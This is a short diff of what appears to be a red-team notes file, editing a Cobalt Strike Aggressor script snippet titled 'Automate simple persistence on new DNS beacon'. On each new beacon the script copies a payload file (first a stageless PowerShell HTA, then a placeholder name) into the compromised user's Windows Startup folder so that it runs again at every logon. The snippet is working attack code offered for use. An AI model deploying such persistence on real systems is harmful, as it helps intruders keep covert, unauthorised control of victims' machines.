@@ -116,7 +116,7 @@ on beacon_initial {
 ### Automate simple persistence on new DNS beacon
 ```
 on beacon_initial {
-	bcp($1, "3powershell-stageless.hta", "c:\\users\\" . binfo($1, "user") . "\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\startfile.hta");
+	bcp($1, "FILEHERE", "c:\\users\\" . binfo($1, "user") . "\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\startfile.EXTHERE");
 }
 ```
 # Python virtual environments
